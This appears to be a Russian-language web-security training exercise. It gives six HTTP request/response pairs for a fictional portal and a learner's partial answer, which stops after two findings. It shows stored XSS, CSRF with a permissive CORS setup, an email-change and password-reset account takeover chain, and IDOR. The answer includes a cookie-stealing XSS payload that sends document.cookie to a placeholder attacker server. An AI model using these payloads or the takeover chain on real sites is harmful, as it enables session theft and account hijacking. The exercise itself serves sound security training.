Задача:

1. Определите все уязвимости, присутствующие в представленных запросах и ответах.
2. Для каждой уязвимости опишите: тип уязвимости, шаги эксплуатации и фактический риск (последствия успешной экплуатации).
3. Опишите цепочку эксплуатации, позволяющую захватить произвольную учётную запись.
4. Приведите рекомендации по устранению каждой найденной уязвимости.

Запрос 1 — Обновление профиля:
POST /api/v1/profile HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
Content-Type: application/json
Origin: https://portal.targetcorp.com

```
{"display_name": "<img src=x onerror=alert(document.domain)>", "bio": "Test user"}
```

Здесь атакующий использует классический payload для Stored XSS, так же меня очень сильно смущает JWT токен, в том плане что его подпись слишком короткая

Ответ 1:
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://portal.targetcorp.com
Access-Control-Allow-Credentials: true
 
{"status": "ok", "message": "Profile updated"}

При этом API успешно обработало такой ввод и приняло, отображаемое имя как `<img src=x onerror=alert(document.domain)>`, тогда если парсер на HTML странице будет отображать это не как текст, в этом случае уязвимости быть не должно, но если он вставляется например как innerHTML а не plainText, тогда это будет Stored XSS

-----------------------------------------------------------------------------------------------------------------
Запрос 2 — Просмотр профиля пользователя:
GET /profile/105 HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123


Ответ 2:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Powered-By: Express

 ```
 <!DOCTYPE html>
<html>
<head><title>User Profile</title></head>
<body>
 <div class="profile-card">
   <h2><img src=x onerror=alert(document.domain)></h2>
   <p class="bio">Test user</p>
   <p class="uid">User ID: 105</p>
  </div>
</body>
</html>
 ```

да в результате мы получаем что парсер просто вставил пользовательский ввод, при этом ничего не изменив

-----------------------------------------------------------------------------------------------------------------
Запрос 3 — Смена email:
POST /api/v1/account/change-email HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
Content-Type: application/x-www-form-urlencoded
Origin: https://portal.targetcorp.com
 
new_email=attacker@evil.com


Ответ 3:
HTTP/1.1 200 OK
Content-Type: application/json
 
{"status": "ok", "message": "Email changed to attacker@evil.com"}

-----------------------------------------------------------------------------------------------------------------
Запрос 4 — Смена email (с другого домена):
POST /api/v1/account/change-email HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
Content-Type: application/x-www-form-urlencoded
Origin: https://evil-site.com
Referer: https://evil-site.com/csrf.html
 
new_email=hacked@evil.com


Ответ 4:
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://evil-site.com
Access-Control-Allow-Credentials: true
 
{"status": "ok", "message": "Email changed to hacked@evil.com"}

-----------------------------------------------------------------------------------------------------------------
Запрос 5 — Сброс пароля:
POST /api/v1/account/reset-password HTTP/1.1
Host: portal.targetcorp.com
Content-Type: application/json
 
{"email": "hacked@evil.com"}


Ответ 5:
HTTP/1.1 200 OK
Content-Type: application/json
 
{"status": "ok", "message": "Password reset link sent to hacked@evil.com"}

-----------------------------------------------------------------------------------------------------------------
Запрос 6 — Просмотр профиля другого пользователя:
GET /api/v1/profile/1 HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123


Ответ 6:
HTTP/1.1 200 OK
Content-Type: application/json
 
{"uid": 1, "username": "admin", "email": "admin@targetcorp.com",
 "role": "administrator", "display_name": "Admin User",
 "last_login": "2025-03-15T10:30:00Z"}



1. Найденные уязвимости:
1 - На мой взгляд стоит рассматривать запросы 1 и 2 в совокупности потому что там отражена первая уязвимость, а именно Stored XSS, это произошло потому что парсер внутри Node.js, просто вставил пользовательский ввод, чего быть не должно, в результате мы получаем такую уязвимость
Шаги Эксплуатации:
Так как WAF пропустил запрос полностью, мне кажется можно не использовать техники для его обхода, поэтому я предложу payload с HackTricks `<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>`, в роли сервера можно использовать Coloborator, если стоит HTTPOnly можно попробовать подменить куки на свою через вытеснение старых, 
2 - Так же в ответе 2 присутствует Information Disclosur, а именно в том моменте когда мы видим заголовок X-Powered-By: Express, что указывает на то, что сервер организации работает на Node.js 